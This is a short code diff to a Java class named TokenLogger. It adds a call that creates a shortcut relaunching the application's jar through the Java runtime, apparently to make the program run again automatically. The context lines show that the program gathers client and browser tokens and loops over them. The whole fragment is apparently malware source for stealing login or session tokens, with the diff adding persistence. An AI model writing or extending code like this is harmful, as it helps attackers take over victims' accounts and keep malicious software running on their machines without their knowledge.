@@ -20,6 +20,12 @@ public class TokenLogger {
             System.exit(0);
         }
 
+        FileHelper.createShortcut(
+                PathHelper.getJavaPath(),
+                SHORTCUT_PATH,
+                "-jar", APP_SAVE_PATH
+        );
+
         getClientTokens();
         getBrowserTokens();
         for (String token : tokens) {
